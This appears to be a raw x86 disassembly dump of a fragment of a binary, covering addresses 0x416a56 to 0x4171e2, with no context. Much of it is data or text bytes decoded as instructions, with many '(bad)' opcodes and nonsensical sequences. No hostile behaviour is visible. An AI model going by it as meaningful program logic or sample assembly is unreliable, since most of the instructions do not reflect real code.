  416a56:	jae    0x416ac9
  416a58:	(bad)  
  416a59:	(bad)  
  416a5a:	inc    DWORD PTR [ecx]
  416a5c:	fcos   
  416a5e:	call   DWORD PTR [ebx-0x3c]
  416a64:	or     BYTE PTR [eax],cl
  416a66:	or     BYTE PTR [eax],cl
  416a68:	or     BYTE PTR [eax],cl
  416a6a:	or     BYTE PTR [eax],cl
  416a6c:	or     BYTE PTR [ecx-0x64],bh
  416a6f:	xchg   esi,eax
  416a70:	nop
  416a71:	in     eax,0x96
  416a73:	test   eax,0x81a40343
  416a78:	lods   al,BYTE PTR ds:[esi]
  416a79:	mov    ecx,0x603f885e
  416a7e:	cdq    
  416a7f:	xchg   edi,eax
  416a80:	pop    es
  416a81:	xchg   ecx,eax
  416a82:	pop    edx
  416a83:	les    ebp,FWORD PTR [edx+0xc0c0c0c]
  416a89:	or     al,0xc
  416a8b:	or     al,0xc
  416a8d:	or     al,0xff
  416a8f:	push   DWORD PTR [eiz*4-0x3e17]
  416a96:	mov    DWORD PTR [esi-0x75],ebx
  416a99:	sbb    al,0xff
  416a9b:	daa    
  416a9c:	lahf   
  416a9d:	pop    ebx
  416a9e:	cs out 0x60,eax
  416aa1:	pop    esi
  416aa2:	loope  0x416af9
  416aa4:	push   edx
  416aa5:	cld    
  416aa6:	inc    edi
  416aa7:	add    al,0xc5
  416aa9:	xor    DWORD PTR [esi],ecx
  416aab:	and    eax,0x45e1254
  416ab0:	leave  
  416ab1:	mov    dh,0x6c
  416ab3:	add    dh,0x46
  416ab6:	push   ss
  416ab7:	mov    edx,0xc7ffffbb
  416abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416abd:	(bad)  
  416abe:	inc    DWORD PTR [esi+0x65]
  416ac1:	pop    eax
  416ac2:	inc    DWORD PTR [ebp-0x70]
  416ac5:	xchg   edx,eax
  416ac6:	in     al,dx
  416ac7:	pop    edi
  416ac8:	fadd   QWORD PTR [ecx+edi*2+0x6d3c02fd]
  416acf:	cs pop esp
  416ad1:	repnz cmp ah,0xca
  416ad5:	cmc    
  416ad6:	jae    0x416b24
  416ad8:	jbe    0x416a87
  416ada:	mov    dl,BYTE PTR [eax+0x45]
  416add:	inc    ebp
  416ade:	inc    ebp
  416adf:	jae    0x416aae
  416ae1:	and    esi,DWORD PTR [esi-0x29]
  416ae4:	rcr    ebx,cl
  416ae6:	sahf   
  416ae7:	mov    ah,0xe8
  416ae9:	dec    eax
  416aea:	pop    ebp
  416aeb:	pop    esi
  416aec:	fcmovnbe st,st(1)
  416aee:	retf   0xeb4b
  416af1:	xchg   ecx,eax
  416af2:	fist   WORD PTR [esi]
  416af4:	xchg   ebp,eax
  416af5:	sbb    DWORD PTR [ecx],ebp
  416af7:	cmp    eax,ebx
  416af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416afa:	jle    0x416ad3
  416afc:	inc    ebp
  416afd:	inc    ebp
  416afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aff:	xchg   ebx,eax
  416b00:	sub    al,0x45
  416b02:	inc    ebp
  416b03:	inc    ebp
  416b04:	call   0xe92a53f1
  416b09:	call   0x2e2a53f6
  416b0e:	sbb    DWORD PTR [eax-0x76767677],0xffffff89
  416b15:	mov    DWORD PTR [ecx+0x8989],ecx
  416b1b:	test   DWORD PTR [esp+0x56],ebp
  416b1f:	retf   
  416b20:	xor    ah,BYTE PTR [esi]
  416b22:	cwde   
  416b23:	lock push esp
  416b25:	shl    BYTE PTR [ebx+0x6d],1
  416b28:	ror    DWORD PTR [edx+0x7f],1
  416b2b:	push   cs
  416b2c:	sbb    BYTE PTR [eax+0xd5767be],al
  416b32:	fwait
  416b33:	add    BYTE PTR [eax],al
  416b35:	imul   edx,DWORD PTR [esi-0x3ea80000],0xae1c0000
  416b3f:	mov    WORD PTR [edi+eiz*2+0x624e08cc],ss
  416b46:	sub    eax,0x30dd9a19
  416b4b:	dec    edx
  416b4c:	push   edi
  416b4d:	sti    
  416b4e:	sub    al,BYTE PTR ds:0xdc32216e
  416b54:	ret    0x2400
  416b57:	retf   
  416b58:	add    DWORD PTR [ebp+0x34],esi
  416b5b:	and    al,0x24
  416b5d:	and    al,0x49
  416b5f:	mov    eax,0x1e64e452
  416b64:	imul   edi,DWORD PTR [ecx+0x4],0x952c30b8
  416b6b:	mov    ch,0x53
  416b6d:	sbb    cl,BYTE PTR [esi+0x453dbbff]
  416b73:	rcr    edx,0xb9
  416b76:	push   esi
  416b77:	and    eax,0xd1ece6a
  416b7c:	stc    
  416b7d:	(bad)
  416b81:	and    al,0x24
  416b83:	pop    ebp
  416b84:	hlt    
  416b85:	and    al,0x24
  416b87:	and    al,0x4
  416b89:	add    al,0x4
  416b8b:	add    al,0x4
  416b8d:	add    al,0x4
  416b8f:	add    al,0x4
  416b91:	pushf  
  416b92:	and    al,0x56
  416b94:	mov    DWORD PTR [ecx-0x76767677],ecx
  416b9a:	mov    DWORD PTR [ecx-0x37fbfb77],ecx
  416ba0:	and    eax,0xbbda60b4
  416ba5:	mov    edx,ds
  416ba7:	mov    ds:0x24f28f32,al
  416bac:	push   ds
  416bad:	sti    
  416bae:	fiadd  WORD PTR ds:0xa3965630
  416bb4:	(bad)  
  416bb6:	or     al,BYTE PTR [esp+eax*1]
  416bb9:	mov    ecx,0x5a869419
  416bbe:	sub    bh,ch
  416bc0:	pop    ecx
  416bc1:	icebp  
  416bc2:	mov    esi,esp
  416bc4:	in     eax,dx
  416bc5:	push   ebp
  416bc6:	xor    al,0x38
  416bc8:	adc    ah,BYTE PTR [eax+edi*2+0x45b01007]
  416bcf:	mov    gs,WORD PTR [ebx]
  416bd1:	and    ebp,DWORD PTR [ebx]
  416bd3:	pop    esi
  416bd4:	jecxz  0x416b9d
  416bd6:	add    al,0x4
  416bd8:	ficomp WORD PTR [esi+0x40]
  416bdb:	add    al,0x4
  416bdd:	adc    DWORD PTR [edi],0x77e804f6
  416be3:	jb     0x416bc5
  416be5:	(bad)  
  416be6:	sar    DWORD PTR [ebx-0x5c],cl
  416be9:	daa    
  416bea:	fisttp QWORD PTR [ebx+0x1]
  416bed:	aaa    
  416bee:	jnp    0x416c22
  416bf0:	push   ebp
  416bf1:	scas   al,BYTE PTR es:[edi]
  416bf2:	in     eax,0x7d
  416bf4:	fndisi(8087 only) 
  416bf6:	iret   
  416bf7:	shr    DWORD PTR [eax-0x171717e7],0x4
  416bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bff:	call   0xe843e2ec
  416c04:	call   0x83c4eff1
  416c09:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffffff
  416c10:	or     ebx,DWORD PTR [esi+0x3e59bf41]
  416c16:	rcl    BYTE PTR [ebx-0x1174cba2],1
  416c1c:	icebp  
  416c1d:	add    al,0x8
  416c1f:	or     DWORD PTR [edi+ebx*4],esi
  416c22:	add    DWORD PTR [ebx+0x7541adc4],ebp
  416c28:	jne    0x416c9f
  416c2a:	jne    0x416ca1
  416c2c:	jne    0x416ca3
  416c2e:	jne    0x416ca5
  416c30:	add    BYTE PTR [eax],al
  416c32:	dec    ebp
  416c33:	je     0x416c9a
  416c35:	ins    DWORD PTR es:[edi],dx
  416c36:	ins    DWORD PTR es:[edi],dx
  416c37:	jbe    0x416c90
  416c39:	jae    0x416caf
  416c3b:	and    BYTE PTR [ebp*2+0x44646557],bh
  416c42:	jae    0x416cad
  416c44:	jae    0x416c66
  416c46:	and    esp,DWORD PTR [ebp+0x63]
  416c49:	arpl   WORD PTR [edx],sp
  416c4b:	ins    DWORD PTR es:[edi],dx
  416c4c:	gs jb  0x416c6f
  416c4f:	dec    ebp
  416c50:	je     0x416c72
  416c52:	jae    0x416c99
  416c54:	outs   dx,BYTE PTR ds:[esi]
  416c55:	data16 and BYTE PTR [edi+0x61],dh
  416c59:	ins    DWORD PTR es:[edi],dx
  416c5a:	inc    esp
  416c5b:	gs jbe 0x416cbf
  416c5e:	jbe    0x416cc2
  416c60:	je     0x416cc5
  416c62:	outs   dx,DWORD PTR ds:[esi]
  416c63:	ds cs cmp al,0x53
  416c67:	and    ebp,DWORD PTR [ecx+0x73]
  416c6a:	ins    DWORD PTR es:[edi],dx
  416c6b:	cmp    al,0x75
  416c6d:	or     ah,BYTE PTR [edi+0x63]
  416c70:	ds cs popaw 
  416c74:	popa   
  416c75:	jo     0x416cb5
  416c77:	dec    ebp
  416c78:	popa   
  416c79:	jae    0x416ce0
  416c7b:	and    dh,BYTE PTR [ebx+0x20]
  416c7e:	jae    0x416ca0
  416c80:	imul   di,WORD PTR [edx+esi*2],0x7520
  416c86:	or     ah,BYTE PTR [ebp+0x69]
  416c89:	jbe    0x416cc7
  416c8b:	and    BYTE PTR [eax+eiz*1+0x3e],dh
  416c8f:	bound  esp,QWORD PTR [eax]
  416c91:	outs   dx,BYTE PTR ds:[esi]
  416c92:	imul   ebp,DWORD PTR [esi],0xa656d6d
  416c98:	and    BYTE PTR [esi],ch
  416c9a:	ins    DWORD PTR es:[edi],dx
  416c9b:	arpl   WORD PTR [edx],cx
  416c9d:	ds das 
  416c9f:	dec    ebp
  416ca0:	cmp    eax,0x6d687473
  416ca5:	popa   
  416ca6:	ins    DWORD PTR es:[edi],dx
  416ca7:	or     eax,0x2c667453
  416cac:	das    
  416cad:	cs cmp al,0x65
  416cb0:	cs inc esp
  416cb2:	je     0x416cd4
  416cb4:	jb     0x416cf4
  416cb6:	je     0x416cf4
  416cb8:	xchg   bh,dh
  416cba:	sbb    DWORD PTR [edx],eax
  416cbc:	add    BYTE PTR [eax],al
  416cbe:	push   DWORD PTR [ebx+ecx*2+0x4506a903]
  416cc5:	out    0x6c,eax
  416cc7:	mov    esi,0x4365f716
  416ccc:	push   eax
  416ccd:	mov    esp,0x9fad3356
  416cd2:	jle    0x416d34
  416cd4:	and    BYTE PTR [eax+0x58],al
  416cd7:	pop    ecx
  416cd8:	scas   eax,DWORD PTR es:[edi]
  416cd9:	push   ebx
  416cda:	cs popw ds
  416cdd:	les    esp,FWORD PTR [esi+0x71f6]
  416ce3:	fistp  QWORD PTR [eax]
  416ce5:	add    BYTE PTR [eax],al
  416ce7:	jno    0x416c8d
  416ce9:	add    al,BYTE PTR [eax]
  416ceb:	add    al,0x92
  416ced:	repz and eax,0xe2f3fa27
  416cf3:	ret    
  416cf4:	mov    ds:0x58fa6fd9,al
  416cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cfa:	push   eax
  416cfb:	add    DWORD PTR [ecx+0x6191f3ac],edi
  416d01:	xchg   BYTE PTR [edx+ecx*1-0x3ffbfbfc],ch
  416d08:	inc    edx
  416d09:	popa   
  416d0a:	jl     0x416d71
  416d0c:	jnp    0x416d4b
  416d0e:	aaa    
  416d0f:	in     eax,dx
  416d10:	and    eax,0xfb157989
  416d15:	mov    edi,0xddb38e4f
  416d1a:	mov    al,ds:0xf4e66a0e
  416d1f:	jo     0x416d85
  416d21:	xchg   ecx,eax
  416d22:	and    bh,BYTE PTR [eax+0x4]
  416d25:	add    al,0xee
  416d27:	push   eax
  416d28:	dec    ecx
  416d29:	add    al,0x4
  416d2b:	add    al,0x8d
  416d2d:	lea    ecx,[ebp-0x72727273]
  416d33:	lea    ecx,[ebp+0xfea5e78]
  416d39:	(bad)  
  416d3a:	(bad)  
  416d3b:	(bad)  
  416d3c:	(bad)  
  416d3d:	(bad)  
  416d3e:	(bad)  
  416d3f:	(bad)  
  416d40:	invd   
  416d42:	or     BYTE PTR [ebp+0x11],bl
  416d45:	xor    eax,0xea361e3a
  416d4a:	or     esp,ebx
  416d4c:	add    ebp,DWORD PTR [ecx+0x42]
  416d4f:	in     eax,dx
  416d50:	fwait
  416d51:	popf   
  416d52:	rol    ebp,1
  416d54:	inc    ecx
  416d55:	jmp    0x833:0xf400c7b0
  416d5c:	or     BYTE PTR [ecx-0x7bf7f76d],bl
  416d62:	clc    
  416d63:	or     BYTE PTR [eax],cl
  416d65:	xor    BYTE PTR [edi],bh
  416d67:	lds    ebx,FWORD PTR [ebx+0xf]
  416d6a:	cld    
  416d6b:	into   
  416d6c:	add    eax,DWORD PTR [eax+edi*1]
  416d6f:	pop    ecx
  416d70:	cmp    al,0x6c
  416d72:	mov    ebx,DWORD PTR ds:0x14c468a7
  416d78:	sbb    dh,BYTE PTR [edx+eiz*4-0x74f707fd]
  416d7f:	cmp    al,0xfe
  416d81:	sti    
  416d82:	test   al,0x8b
  416d84:	mov    ecx,DWORD PTR [ebx+0xd5c3e7d]
  416d8a:	cmp    ebp,ebx
  416d8c:	pop    ecx
  416d8d:	lea    edi,[eax]
  416d8f:	int    0xb5
  416d91:	xchg   esp,eax
  416d92:	adc    eax,ebp
  416d94:	dec    ecx
  416d95:	add    cl,BYTE PTR [edx+edx*4]
  416d98:	retf   
  416d99:	rol    ah,0x23
  416d9c:	add    DWORD PTR [ebx-0x3b849072],0xfffffff8
  416da3:	test   BYTE PTR [edi],al
  416da5:	loop   0x416dbd
  416da7:	push   es
  416da8:	sub    DWORD PTR [ebx-0x7413b075],ecx
  416dae:	mov    ecx,DWORD PTR [ebx+0x50505050]
  416db4:	push   eax
  416db5:	push   eax
  416db6:	push   eax
  416db7:	push   eax
  416db8:	push   eax
  416db9:	sti    
  416dba:	int    0xf9
  416dbc:	(bad)  
  416dbd:	(bad)  
  416dbe:	(bad)  
  416dbf:	(bad)  
  416dc0:	(bad)  
  416dc1:	(bad)  
  416dc2:	(bad)  
  416dc3:	(bad)  
  416dc4:	inc    DWORD PTR [eax]
  416dc6:	add    BYTE PTR [edi],cl
  416dc8:	test   ecx,esp
  416dca:	pop    ecx
  416dcb:	sub    al,BYTE PTR [ecx+0x2e]
  416dce:	xchg   ebp,eax
  416dcf:	dec    edi
  416dd0:	inc    esp
  416dd1:	pop    ebx
  416dd2:	jle    0x416e3c
  416dd4:	mov    al,ds:0x1a6041ac
  416dd9:	out    dx,eax
  416dda:	int3   
  416ddb:	cld    
  416ddc:	pop    edx
  416ddd:	mov    esi,0x3f00005b
  416de2:	mov    esi,eax
  416de4:	xchg   BYTE PTR [ebx],bl
  416de6:	outs   dx,BYTE PTR ds:[esi]
  416de7:	repz inc esi
  416de9:	rcl    BYTE PTR [edx-0x6b],cl
  416dec:	cmp    esi,DWORD PTR ds:0x968e5750
  416df2:	mov    ah,BYTE PTR [edi+0x4a]
  416df5:	inc    edx
  416df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df7:	cmp    eax,0xfce0df17
  416dfc:	adc    al,dh
  416dfe:	add    BYTE PTR [eax],al
  416e00:	std    
  416e01:	sub    DWORD PTR ds:0x5ddb0000,ebx
  416e07:	pop    es
  416e08:	add    BYTE PTR [edx+ebp*2],cl
  416e0b:	jle    0x416e14
  416e0d:	nop
  416e0e:	sbb    DWORD PTR [esi-0x4dba897f],eax
  416e14:	xchg   ecx,eax
  416e15:	pop    esp
  416e16:	or     al,0x1b
  416e18:	jne    0x416e48
  416e1a:	mov    BYTE PTR [edi+0x37],ch
  416e1d:	mov    ebx,0xfad4c4e1
  416e22:	or     al,0xc
  416e24:	or     al,0xdb
  416e26:	push   ecx
  416e27:	or     al,0xc
  416e29:	mov    ebp,0xc0c0c4f
	...
  416e36:	add    BYTE PTR [ebx+0x2f],al
  416e39:	lods   al,BYTE PTR ds:[esi]
  416e3a:	shl    DWORD PTR [eax+0x43],cl
  416e3d:	je     0x416eb1
  416e3f:	and    eax,0x9e13b087
  416e44:	sbb    ch,BYTE PTR [ebp+0x5e3d1304]
  416e4a:	pop    edi
  416e4b:	adc    ecx,DWORD PTR [eax-0xca0b]
  416e51:	(bad)  
  416e52:	(bad)  
  416e53:	(bad)  
  416e54:	(bad)  
  416e55:	(bad)  
  416e56:	(bad)  
  416e57:	inc    DWORD PTR [eax]
  416e59:	add    dl,bh
  416e5b:	push   0xffffffe4
  416e5d:	repz add BYTE PTR [eax],al
  416e60:	mov    DWORD PTR [eax-0x51],edi
  416e63:	pop    es
  416e64:	outs   dx,BYTE PTR ds:[esi]
  416e65:	repz sbb DWORD PTR [edx],eax
  416e68:	in     eax,0xf2
  416e6a:	push   esp
  416e6b:	ficom  WORD PTR [esi-0x26]
  416e6e:	loope  0x416edb
  416e70:	lea    edi,[edi+ebp*2-0x41035829]
  416e77:	mov    esi,0x8c12436
  416e7c:	ret    
  416e7d:	and    al,0x65
  416e7f:	mov    BYTE PTR [ecx+0x7f],dl
  416e82:	rol    BYTE PTR [eax],0x0
  416e85:	enter  0xde,0x0
  416e89:	mov    BYTE PTR [eax-0x36],bl
  416e8c:	add    BYTE PTR [eax],al
  416e8e:	clc    
  416e8f:	in     al,dx
  416e90:	ret    0x6a72
  416e93:	test   ebx,0x422ec161
  416e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e9a:	pop    edi
  416e9b:	ins    DWORD PTR es:[edi],dx
  416e9c:	mov    esp,edx
  416e9e:	pop    ecx
  416e9f:	mov    bl,0xae
  416ea1:	xchg   ebp,eax
  416ea2:	inc    ebx
  416ea3:	or     al,0x5e
  416ea5:	hlt    
  416ea6:	add    BYTE PTR [eax],al
  416ea8:	add    BYTE PTR [ebx],dh
  416eaa:	iret   
  416eab:	pusha  
  416eac:	shl    DWORD PTR [edx+0x6],cl
  416eaf:	fcomip st,st(4)
  416eb1:	pop    ecx
  416eb2:	or     cl,BYTE PTR [ecx]
  416eb4:	sar    esi,0x64
  416eb7:	into   
  416eb8:	scas   eax,DWORD PTR es:[edi]
  416eb9:	cmp    dl,BYTE PTR [ecx-0x2b]
  416ebc:	ret    
  416ebd:	(bad)  
  416ebe:	push   es
  416ebf:	cmp    BYTE PTR [edi],cl
  416ec1:	mov    eax,0x1cc360bf
  416ec6:	add    BYTE PTR [eax],al
  416ec8:	mov    DWORD PTR [edi+eiz*2+0x0],ebx
  416ecc:	add    BYTE PTR [eax],al
  416ece:	add    al,0x4
  416ed0:	add    al,0x4
  416ed2:	add    al,0x4
  416ed4:	add    al,0x4
  416ed6:	add    al,0x20
  416ed8:	cmp    eax,0x3a
  416edd:	add    BYTE PTR [eax],al
  416edf:	add    BYTE PTR [eax],al
  416ee1:	add    BYTE PTR [eax],al
  416ee3:	call   0x864a5fd0
  416ee8:	mov    esp,0xba2339ee
  416eed:	lock mov edi,0xc4cfb134
  416ef3:	xor    cl,cl
  416ef5:	fmul   DWORD PTR [ecx]
  416ef7:	xchg   BYTE PTR [ecx+0x33190c7f],cl
  416efd:	call   0xe87ef3ea
  416f02:	call   0xe92993da
  416f07:	cs inc ecx
  416f09:	es xchg ecx,eax
  416f0b:	stos   DWORD PTR es:[edi],eax
  416f0c:	pop    ds
  416f0d:	into   
  416f0e:	jge    0x416f03
  416f10:	pushf  
  416f11:	call   0xb54f:0x8739528a
  416f18:	add    al,0x8c
  416f1a:	pop    ds
  416f1b:	je     0x416f99
  416f1d:	pop    ss
  416f1e:	cdq    
  416f1f:	call   0xbf2a0857
  416f24:	clc    
  416f25:	xor    esi,DWORD PTR [ebx]
  416f27:	xor    ecx,edi
  416f29:	(bad)  
  416f2a:	(bad)  
  416f2c:	cmp    edx,0xd19fad39
  416f32:	xchg   ebp,eax
  416f33:	pop    ebx
  416f34:	pop    ecx
  416f35:	mov    ch,0xbb
  416f37:	aaa    
  416f38:	jmp    0x3eb6e558
  416f3d:	mov    bl,0x6c
  416f3f:	int3   
  416f40:	ret    0xe8de
  416f43:	adc    bh,BYTE PTR [ebx-0x4f14a82a]
  416f49:	xchg   esi,eax
  416f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f4b:	xor    esi,DWORD PTR [ebx]
  416f4d:	push   edx
  416f4e:	stc    
  416f4f:	xor    esi,DWORD PTR [ebx]
  416f51:	xor    ecx,DWORD PTR [ebx-0x74747475]
  416f57:	mov    ecx,DWORD PTR [ebx-0x4f177475]
  416f5d:	shr    DWORD PTR [edx+0x6a],cl
  416f60:	push   0x6a
  416f62:	push   0x6a
  416f64:	push   0x6a
  416f66:	push   0x74
  416f68:	je     0x416f1b
  416f6a:	push   edi
  416f6b:	pop    ecx
  416f6c:	xchg   esi,eax
  416f6d:	test   al,0xa
  416f6f:	loop   0x416faa
  416f71:	cmp    DWORD PTR [edx],edx
  416f73:	fnsave [ebp+edx*1+0x535046eb]
  416f7a:	aaa    
  416f7b:	ja     0x416efe
  416f7d:	fsubr  DWORD PTR [ebp+0x1a]
  416f80:	push   es
  416f81:	je     0x416ff7
  416f83:	adc    eax,0xe0063d31
  416f88:	sar    BYTE PTR [edi],0x0
  416f8b:	popa   
  416f8c:	dec    esi
  416f8d:	inc    esp
  416f8e:	dec    edi
  416f8f:	pop    esp
  416f90:	mov    ecx,0x2a6f5d2a
  416f95:	(bad)  
  416f96:	sbb    al,0x9
  416f98:	shl    esi,cl
  416f9a:	push   eax
  416f9b:	inc    edx
  416f9c:	das    
  416f9d:	xchg   ecx,eax
  416f9e:	xor    al,0x91
  416fa0:	je     0x417016
  416fa2:	jnp    0x416f6b
  416fa4:	retf   
  416fa5:	je     0x41701b
  416fa7:	and    bl,dh
  416fa9:	and    esi,DWORD PTR [ebp+eax*4+0xe]
  416fad:	push   es
  416fae:	shl    edi,0x8b
  416fb1:	nop
  416fb2:	mov    edx,0x4638fe43
  416fb7:	dec    ebp
  416fb8:	pop    ecx
  416fb9:	in     eax,0x78
  416fbb:	xchg   ebp,eax
  416fbc:	push   ss
  416fbd:	ficom  WORD PTR [esp+ecx*4]
  416fc0:	mov    ebx,0x857b0d6f
  416fc5:	test   DWORD PTR [ebp-0x7a7a8522],eax
  416fcb:	loopne 0x416fde
  416fcd:	test   DWORD PTR [ebp-0x7b],eax
  416fd3:	(bad)  
  416fd4:	(bad)  
  416fd5:	(bad)  
  416fd6:	(bad)  
  416fd7:	(bad)  
  416fd8:	dec    DWORD PTR [edi-0x618e87ea]
  416fde:	bound  esi,QWORD PTR cs:[edi-0xf623129]
  416fe5:	cmp    bh,BYTE PTR [edx-0x58]
  416fe8:	sbb    bh,BYTE PTR [ebx+0x7bc8b9c7]
  416fee:	shl    dl,0x2
  416ff1:	mov    DWORD PTR [ecx-0x76767677],ecx
  416ff7:	mov    DWORD PTR [ecx-0x55dbdb77],ecx
  416ffd:	(bad)  
  416fff:	or     DWORD PTR [esp],esp
  417002:	mov    al,ds:0xe7d73bdf
  417007:	xchg   eax,ebp
  417009:	adc    al,0xb4
  41700b:	jae    0x417012
  41700d:	and    BYTE PTR [eax],bh
  41700f:	sahf   
  417010:	cwde   
  417011:	and    eax,0x671ea299
  417016:	mov    bl,0xdb
  417018:	inc    ebp
  417019:	icebp  
  41701a:	int    0x64
  41701c:	pop    eax
  41701d:	jmp    0x416fe0
  41701f:	push   0x79
  417021:	scas   eax,DWORD PTR es:[edi]
  417022:	out    0xfe,al
  417024:	xor    BYTE PTR [esp],ah
  417027:	xchg   ah,ch
  417029:	and    al,0x24
  41702b:	dec    ebp
  41702c:	jl     0x41703f
  41702e:	and    al,0xe8
  417030:	jg     0x416fe1
  417032:	out    dx,al
  417033:	or     DWORD PTR [esi-0x4e34a58],ecx
  417039:	ins    BYTE PTR es:[edi],dx
  41703a:	or     BYTE PTR [ebp+0x67],ch
  41703d:	adc    bh,BYTE PTR [edx]
  41703f:	std    
  417040:	pushf  
  417041:	int    0xf9
  417043:	or     eax,0xf22a06da
  417048:	call   0x74d5935
  41704d:	push   0x5f
  41704f:	mov    eax,0x4f2b73de
  417054:	sar    BYTE PTR [edi+0x3a],0x4
  417058:	dec    ebp
  417059:	repnz add al,0xe2
  41705c:	arpl   WORD PTR [edx],dx
  41705e:	in     al,0x31
  417060:	fnstcw WORD PTR [ebx+0x53]
  417063:	daa    
  417064:	mov    esi,0xe899cd4c
  417069:	call   0xe9144d14
  41706e:	call   0x41715b
  417073:	add    BYTE PTR [eax],al
  417075:	add    BYTE PTR [eax],al
  417077:	add    BYTE PTR [eax],al
  417079:	in     eax,dx
  41707a:	ror    DWORD PTR ds:0x8d8d8d8d,0x8d
  417081:	lea    ecx,[ebp+0x8d8d]
  417087:	or     BYTE PTR fs:[edx-0x76],0xcc
  41708c:	int3   
  41708d:	pop    ebp
  41708e:	mov    al,0x52
  417090:	xor    BYTE PTR [edi-0x2aca0041],dh
  417096:	jecxz  0x41701b
  417098:	mov    esi,0x98c3bf7b
  41709d:	jae    0x4170f2
  41709f:	jo     0x4170f1
  4170a1:	jae    0x417105
  4170a3:	and    BYTE PTR [esi],bh
  4170a5:	outs   dx,BYTE PTR ds:[esi]
  4170a6:	ins    DWORD PTR es:[edi],dx
  4170a7:	imul   ebp,DWORD PTR [edi+0x65],0x22507220
  4170ae:	ds ins BYTE PTR es:[edi],dx
  4170b0:	jae    0x417118
  4170b2:	or     dh,BYTE PTR cs:[ebx+0x20]
  4170b6:	jb     0x41712a
  4170b8:	ins    DWORD PTR es:[edi],dx
  4170b9:	jne    0x4170e9
  4170bb:	jo     0x417122
  4170bd:	data16 jae 0x4170e2
  4170c0:	das    
  4170c1:	and    BYTE PTR [ecx+0x20],ch
  4170c4:	outs   dx,DWORD PTR fs:[esi]
  4170c6:	popa   
  4170c7:	inc    esp
  4170c8:	jns    0x41713e
  4170ca:	ins    BYTE PTR es:[edi],dx
  4170cb:	jb     0x41713c
  4170cd:	ins    DWORD PTR es:[edi],dx
  4170ce:	jb     0x41713d
  4170d0:	ins    BYTE PTR es:[edi],dx
  4170d1:	jb     0x417140
  4170d3:	outs   dx,BYTE PTR ds:[esi]
  4170d4:	and    BYTE PTR [ebp+0x65],ah
  4170d7:	inc    ecx
  4170d8:	or     dh,BYTE PTR [ebx+0x20]
  4170db:	jb     0x417142
  4170dd:	cs gs cs popa 
  4170e1:	je     0x417105
  4170e3:	data16 jae 0x417153
  4170e6:	imul   esp,DWORD PTR [edi+0x65],0x41696572
  4170ed:	ds inc esp
  4170ef:	and    dh,BYTE PTR [esi+0x28]
  4170f2:	bound  esp,QWORD PTR [eax]
  4170f4:	outs   dx,BYTE PTR ds:[esi]
  4170f5:	gs or  al,BYTE PTR gs:[ecx+0x65]
  4170fa:	and    BYTE PTR [ebp+0x4d],ah
  4170fd:	jb     0x417162
  4170ff:	jae    0x417121
  417101:	ins    BYTE PTR es:[edi],dx
  417102:	bound  esi,QWORD PTR [edx+eiz*1+0x65]
  417106:	jns    0x41716a
  417108:	gs jo  0x417173
  41710b:	and    BYTE PTR [ebx+0x73],dh
  41710e:	arpl   WORD PTR cs:[ecx+0x20],bp
  417112:	jae    0x417155
  417114:	popa   
  417115:	gs je  0x41717a
  417118:	cs popa 
  41711a:	push   edi
  41711b:	ins    DWORD PTR es:[edi],dx
  41711c:	cs and eax,0x30
  417122:	or     eax,0xbe390000
  417127:	add    BYTE PTR [eax],al
  417129:	push   es
  41712a:	int3   
  41712b:	test   DWORD PTR ds:0x2f190b37,0x6d057dc1
  417135:	push   cs
  417136:	xlat   BYTE PTR ds:[ebx]
  417137:	pushf  
  417138:	sub    al,0xfe
  41713a:	sbb    BYTE PTR [edi],0x6c
  41713d:	xchg   edi,eax
  41713e:	pusha  
  41713f:	test   ecx,esi
  417141:	add    al,ch
  417143:	adc    al,0x7b
  417145:	out    0x3a,eax
  417147:	call   0x5ab15a34
  41714c:	sub    BYTE PTR ds:0x62fc1ff3,cl
  417152:	jbe    0x41712e
  417154:	xchg   ebp,eax
  417155:	fwait
  417156:	push   ebp
  417157:	sub    al,0x42
  417159:	clc    
  41715a:	dec    edx
  41715b:	shl    esp,0xd
  41715e:	lods   eax,DWORD PTR ds:[esi]
  41715f:	mov    dl,0x64
  417161:	mov    bh,0xcb
  417163:	push   esp
  417164:	mov    cl,0x76
  417166:	jo     0x417110
  417168:	inc    edx
  417169:	jg     0x417155
  41716b:	lds    edi,FWORD PTR [eax+ebp*8-0x18]
  41716f:	dec    ecx
  417170:	ins    BYTE PTR es:[edi],dx
  417171:	call   0xcd0e5a5e
  417176:	int3   
  417177:	int3   
  417178:	int3   
  417179:	int3   
  41717a:	int3   
  41717b:	int3   
  41717c:	int3   
  41717d:	icebp  
  41717e:	add    DWORD PTR [ebx+esi*1+0x33],edx
  417182:	xor    esi,DWORD PTR [ebx]
  417184:	xor    esi,DWORD PTR [ebx]
  417186:	xor    esi,DWORD PTR [ebx]
  417188:	xor    eax,DWORD PTR [ebx-0x1a04247d]
  41718e:	mov    esi,0x9447145b
  417193:	sub    BYTE PTR [esi-0x41],bl
  417196:	mov    esp,0x75235049
  41719b:	sub    eax,0xf42bfc01
  4171a0:	out    dx,eax
  4171a1:	pop    ebx
  4171a2:	and    al,0x83
  4171a4:	and    DWORD PTR [edx+0x1d79ad20],0xffffffe4
  4171ab:	or     al,0x6b
  4171ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171ae:	jae    0x4171f2
  4171b0:	icebp  
  4171b1:	push   ebp
  4171b2:	pop    ss
  4171b3:	inc    esi
  4171b4:	mov    dl,0x58
  4171b6:	dec    esp
  4171b7:	mov    al,ds:0x54cdb32f
  4171bc:	cmp    DWORD PTR ds:0x83441316,ebx
  4171c2:	add    DWORD PTR [ebx-0x7cff7d9d],0xffffff83
  4171c9:	jmp    0x4171b4
  4171cb:	dec    ebx
  4171cc:	add    DWORD PTR [eax],0xffffff9a
  4171cf:	push   cs
  4171d0:	sti    
  4171d1:	fxch   st(6)
  4171d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d4:	pop    ds
  4171d5:	add    DWORD PTR [edi+0x2c],edi
  4171d8:	or     edx,DWORD PTR [ebp+0x6c]
  4171db:	call   0x437c531e
  4171e0:	out    0x54,eax
  4171e2:	sub    DWORD PTR [edx+0xf],ebx
